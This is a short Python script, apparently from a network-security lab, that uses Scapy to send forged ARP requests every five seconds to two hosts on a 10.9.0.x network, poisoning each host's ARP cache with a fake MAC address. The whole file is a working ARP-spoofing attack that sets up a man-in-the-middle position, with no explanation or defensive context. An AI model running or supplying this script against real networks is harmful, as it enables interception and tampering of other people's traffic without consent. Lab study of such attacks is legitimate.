#!/usr/bin/env python3
from scapy.all import *
from time import *


def attack(IP_V, IP_T):
    MAC_T_fake ="02:42:0a:09:00:69"
    # Constructing ARP Request packet
    ether  = Ether(src = MAC_T_fake, dst = "ff:ff:ff:ff:ff:ff")
    arp    = ARP(psrc = IP_T , hwsrc = MAC_T_fake, pdst = IP_V)
    arp.op = 1   # Request

    frame  = ether/arp
    sendp(frame)

while(True):
    attack("10.9.0.5","10.9.0.6")
    attack("10.9.0.6","10.9.0.5")
    sleep(5)
